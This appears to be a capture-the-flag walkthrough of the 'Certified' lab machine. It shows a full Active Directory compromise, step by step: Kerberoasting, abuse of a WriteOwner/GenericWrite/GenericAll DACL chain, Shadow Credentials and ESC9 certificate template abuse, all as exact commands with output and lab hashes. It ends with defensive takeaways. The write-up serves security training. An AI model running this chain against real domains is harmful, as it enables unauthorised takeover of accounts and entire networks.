---
title: "Certified"
slug: "certified"
toc:
  - id: "reconnaissance"
    label: "Reconnaissance"
  - id: "domain-enumeration"
    label: "Domain Enumeration"
  - id: "dacl-attack-chain"
    label: "DACL Attack Chain"
  - id: "user-flag"
    label: "User Flag"
  - id: "adcs-enumeration"
    label: "ADCS Enumeration"
  - id: "esc9-exploitation"
    label: "ESC9 Exploitation"
  - id: "privilege-escalation"
    label: "Privilege Escalation"
  - id: "root-flag"
    label: "Root Flag"
  - id: "key-takeaways"
    label: "Key Takeaways"
---

## Reconnaissance

As usual I started with a full TCP scan.

```
$ nmap -sCV -Pn -n -p- --min-rate=10000 -T4 10.129.231.186
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 13:24 +0200
Warning: 10.129.231.186 giving up on port because retransmission cap hit (6).
Stats: 0:01:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.50% done; ETC: 13:26 (0:00:00 remaining)
Nmap scan report for 10.129.231.186
Host is up (0.13s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-19 18:25:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-08-19T18:27:11+00:00; +7h00m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-19T18:27:10+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-08-19T18:27:11+00:00; +7h00m03s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-08-19T18:27:10+00:00; +7h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m01s
| smb2-time:
|   date: 2026-08-19T18:26:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.94 seconds
```

> **Note:** This is the `certified.htb` domain controller (DC01) with the usual AD service set plus WinRM on 5985. There's a ~7-hour clock skew between my host and the DC — Kerberos is sensitive to time, so it's worth keeping in mind (Certipy reads the server's time, so the ticket-based steps here tolerate it).

I added the hostnames to `/etc/hosts` before proceeding.

```
$ echo '10.129.231.186    certified.htb dc01.certified.htb' | sudo tee -a /etc/hosts
```

## Domain Enumeration

This is an assumed-breach box: I was given the credentials `judith.mader:judith09`. I started with a BloodHound collection to map the domain.

```
$ bloodhound-ce-python -ns 10.129.231.186 -u judith.mader -p judith09 -d certified.htb --dns-tcp --zip --auth-method ntlm  -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: certified.htb
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 15S
INFO: Compressing output into 20260819145435_bloodhound.zip
```

Marking `judith.mader` as owned and pathfinding toward the `ca_operator` account surfaced a clean ACL chain that leads from my low-privileged user all the way to control of that account.

[![BloodHound: WriteOwner on Management, GenericWrite to management_svc, GenericAll to ca_operator](/images/walkthroughs/certified/dacl-chain.png)](/images/walkthroughs/certified/dacl-chain.png)

> **Note:** The path is three ACL edges in a row: `judith.mader` has `WriteOwner` over the `Management` group, the group has `GenericWrite` over `management_svc`, and `management_svc` has `GenericAll` over `ca_operator`. Each edge is independently abusable, so I can walk the chain one hop at a time.

Since `management_svc` is a service account it is most likely kerberoastable, so I tried a Kerberoast and successfully retrieved its TGS hash.

```
$ nxc ldap certified.htb -u judith.mader -p judith09 --kerberoasting kerberoasting.txt
LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never)
LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09
LDAP        10.129.231.186  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.231.186  389    DC01             [*] Total of records returned 1
LDAP        10.129.231.186  389    DC01             [*] sAMAccountName: management_svc, memberOf: ['CN=Management,CN=Users,DC=certified,DC=htb', 'CN=Remote Management Users,CN=Builtin,DC=certified,DC=htb'], pwdLastSet: 2024-05-13 17:30:51.476756, lastLogon: 2026-08-20 01:10:37.488992
LDAP        10.129.231.186  389    DC01             $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb\management_svc*$7b3164b2a4bdb3019adc85480162604d$dc774f9fec4be92dbcaa978a7d66cbb50ed6d566d880ba485ec59fa1b971f7db4d9b94755d05cc14d41dd6571b65a6a5c5e8dc7610ed8a2e9e666783679a8fdfb83d9c97b3faf4cbae35d8175c67798d77b86f83b99962b6748b03d628d44f6546cb16913bbd2263c74966149064a85827c6c157e0bf6c2699939514ad4e439ae8122d60708d49532f82ab245aba47b8cebfe51e3da6c3221992b47e7d04c8d37b8cc5e5a9906984c58896dafe9399ee013bb295b2be018a5f205bea9567a7cb974bf57ccb907448143f8ee1254b23bd7827fc8a38c01a27cd030fb8d81d5223b9b93e6ce11747e27243864e056599241a1a9fc8fa322247c75dfee58f06916e7faae4d6a00630d76e8bac14de9cb7a5c736274002455655b3ac8794e96dd1ba47b910ed9f84c14d59f774cfae372a185d1e5207f7a21406997942887b4118e7e4b8c7849e2e3d55dcd7f27a676344eafd79deb5fd8e8d1e7b0c0489a13bc1b0cb4edeee293a79625f388a21542756bcc915cf68ddc72082a59f3bfe735b6d377391690f0b9b500385a229e8046f91afe5c88e6869ed6795ecfe8e1332e46aa24585520094984ade1e4f686fc637027b07e1a21f39698898250316793575f9fd9a650b4db48948e97bf148cc98d2ed106796a902aa85880ac7b5cd84ed50f6a62ac15159037c3a3d5af953e80fde2e3f44ae470dba03648e45b07eac81044b39a5b3fa9a079d1e9e0c93bc1aa85f3345dc82682a5486be35293530a23b5120081d667ead72f6fea300b855ac1c89de6aaac4784afa2e9d6527844649e4ffd7697120e7030acaf718486b636260b339b074e743ff00dbecf907fd5e5d8be242d8a65f889892d9fa1dc4abdc0454cc6558df4e6723c57d054d26d1e761032d9e35ebe7d1288e31769c432e39bde48b427c46b48d08793a354ddb71f117a3badeca8832c81c41936e496fafe4880cc91c76b04dfe701473cbad5938f24dbb81179eeb70062405117467553dd39878813089d2421be2f06cd66a031b44577d8c2c22e47c7d4b58c270f5c934dc99eb042cc3dc1ce630ea239bef420a89e9219eba533b5e3aea11db96d4348d8eaff85acb183f0c11caf68a8f8bbd6e6eef8717ba5e0e3a0cd46a5a17ad205466a7e2364ced9a01c176549899d710fd628f6a4d208e1549c592a8f81deb6bd91fe1669c165db0ee15b02cd56c60c0492b52abcb6bf00bcdbfe1dbaa0df7f4ced70ec9c20a02107b86b831efd7f68bbbe65c8bf7aedee0650ef188d076e0093ea566e4ad5dc27a20c6c53c5f777f695f27a8f24f40cb3b98c3562f8bd357bf9acdc54e9ded9fa5298aaee407743cce54c7fa7d6ff8c6a3348abec21dbf9c95670369b696f15de2496b77239e56565863aba34713fa9a6f81a3495a15d5f286de86d1aafdfe472967e16fcf37c049f60e3d0482a9ba6c1cbeebcd15c42b6661377ee086cba945ec3d9e00885562864d07d7c0c720557ffffd0a29d6514cfff46bda7740b73ef7845f6895439f7a9ba261db558d46fe39a0763d1e89165dc3a2124995edb43c752842cd49139cad131044
```

I was hoping to skip the first step of the chain by just cracking the hash with `rockyou.txt`, but it failed.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 DONE (2026-08-20 06:42) 0g/s 1148Kp/s 1148Kc/s 1148KC/s !!12Honey..*7¡Vamos!
Session completed.
```

## DACL Attack Chain

### WriteOwner

The first step leverages the `WriteOwner` permission `judith.mader` holds over the `Management` group, making her the new owner of the group.

```
$ bloodyad -u judith.mader -p judith09 -d certified.htb --dc-ip 10.129.231.186  set owner Management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on Management
```

As the owner, the account can grant itself `GenericAll` over the group.

```
$ bloodyad -u judith.mader -p judith09 -d certified.htb --dc-ip 10.129.231.186 add genericAll management judith.mader
[+] judith.mader has now GenericAll on management
```

Finally `judith.mader` adds herself to the `Management` group and inherits the group's permissions over `management_svc`.

```
$ bloodyad -u judith.mader -p judith09 -d certified.htb --dc-ip 10.129.231.186 add groupMember Management judith.mader
[+] judith.mader added to Management
```

### GenericWrite

`GenericWrite` over an account allows modifying its `msDS-KeyCredentialLink` attribute, which is exactly what a Shadow Credentials attack does. The `shadow` module of `certipy-ad` automates it, and with a single command I got a `.ccache` ticket (and the NT hash) for `management_svc`.

```
$ certipy-ad shadow auto -u judith.mader -p judith09 -dc-ip 10.129.231.186 -account management_svc
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '72956ca35f604838896ab2f0cb87ae13'
[*] Adding Key Credential with device ID '72956ca35f604838896ab2f0cb87ae13' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '72956ca35f604838896ab2f0cb87ae13' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

### GenericAll

I repeated the Shadow Credentials attack against `ca_operator`, this time authenticating with the `management_svc` ticket that holds `GenericAll` over it.

```
$ KRB5CCNAME=./management_svc.ccache certipy-ad shadow auto -u management_svc@certified.htb -k -no-pass -dc-host dc01.certified.htb -target dc01.certified.htb -ns 10.129.231.186 -account ca_operator
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '06909476b4c44a02ade43160b6abe639'
[*] Adding Key Credential with device ID '06909476b4c44a02ade43160b6abe639' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '06909476b4c44a02ade43160b6abe639' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

> **Note:** Shadow Credentials is preferable to just resetting the target's password. It adds and then restores the key credential, so the real account's password is never changed — no lockouts, no disruption to the service, and less chance of detection.

## User Flag

`management_svc` is a member of Remote Management Users, so its ticket gave me a WinRM shell and the user flag.

```
$ evil-winrm -i dc01.certified.htb -r certified.htb --ccache ./management_svc.ccache

<SNIP>
*Evil-WinRM* PS C:\Users\management_svc\Documents> cat ../desktop/user.txt
b98a************************2f78
```

## ADCS Enumeration

The `ca_operator` name strongly suggests this account matters to the certificate authority, so I used its ticket to enumerate ADCS for vulnerable templates.

```
$ KRB5CCNAME=./ca_operator.ccache certipy-ad find -vulnerable -stdout -u 'ca_operator@certified.htb' -k -no-pass -target dc01.certified.htb -ns 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

> **Note:** ESC9 means the `CertifiedAuthentication` template carries the `NoSecurityExtension` flag, so a certificate minted from it won't embed the requester's SID. Without that SID binding, the KDC falls back to mapping the certificate by its UPN. If I can change a target's UPN to `administrator` before enrolling, the resulting certificate will authenticate as the domain admin.

## ESC9 Exploitation

The "other prerequisites" are two: I need to control an account that can change another account's UPN, and that other account must have enrollment rights on the vulnerable template. Both are satisfied — `management_svc` has `GenericAll` over `ca_operator`, and `ca_operator` can enroll in `CertifiedAuthentication`. I used the `management_svc` ticket to set `ca_operator`'s UPN to `administrator@certified.htb`.

```
$ KRB5CCNAME=./management_svc.ccache certipy-ad account update -u 'management_svc@certified.htb' -k -no-pass -target dc01.certified.htb -ns 10.129.231.186 -user ca_operator -upn administrator@certified.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator@certified.htb
[*] Successfully updated 'ca_operator'
```

Now, enrolling the vulnerable template as `ca_operator` produced a certificate whose UPN is `administrator@certified.htb`.

```
$ KRB5CCNAME=./ca_operator.ccache certipy-ad req -u 'ca_operator@certified.htb' -k -no-pass -target dc01.certified.htb -ns 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@certified.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Before using the certificate I reverted `ca_operator`'s UPN to avoid a collision with the real administrator during authentication.

```
$ KRB5CCNAME=./management_svc.ccache certipy-ad account update -u 'management_svc@certified.htb' -k -no-pass -target dc01.certified.htb -ns 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

## Privilege Escalation

Authenticating with the forged certificate returned a TGT for the administrator and dumped the account's NT hash.

```
$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certified.htb'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

## Root Flag

I used the administrator ticket to open a WinRM shell on the DC and read the root flag.

```
$ evil-winrm -i dc01.certified.htb -r certified.htb --ccache ./administrator.ccache

<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
a867************************51a1
```

## Key Takeaways

**ACL Chains Collapse Into Full Control** — A single `WriteOwner` edge on a group was enough to take ownership, grant myself `GenericAll`, join the group, and inherit its control over a service account. BloodHound stitched the whole path together in seconds. Audit object-level DACLs on groups and accounts, and remove control grants (`WriteOwner`, `GenericWrite`, `GenericAll`) that no one needs.

**Shadow Credentials Beat Password Resets** — Abusing `GenericWrite`/`GenericAll` by writing `msDS-KeyCredentialLink` let me authenticate as `management_svc` and `ca_operator` without ever changing their passwords, keeping the accounts functional and quiet. Monitor writes to `msDS-KeyCredentialLink` and restrict who can modify it; it is as powerful as a password reset.

**ESC9 Turns UPN Control Into Domain Admin** — A template flagged `NoSecurityExtension` lets a certificate be mapped by UPN instead of SID, so changing `ca_operator`'s UPN to `administrator` before enrollment produced a logon certificate for the domain admin. Remove the `CT_FLAG_NO_SECURITY_EXTENSION` flag from templates, require manager approval, and tightly scope enrollment rights.

**Service Accounts Need Strong Secrets** — `management_svc` had an SPN, so a Kerberoast handed me its ticket immediately; only its strong password stopped the offline crack. Give service accounts long random passwords (or use gMSAs) and limit which accounts carry SPNs.

**Over-Long Certificate Validity Is a Persistence Gift** — The CA certificate is valid for 100 years and the vulnerable template for 1,000, so a single forged certificate would authenticate as the administrator for the lifetime of the domain, surviving password resets. Set realistic validity periods and be prepared to revoke issued certificates after a compromise.
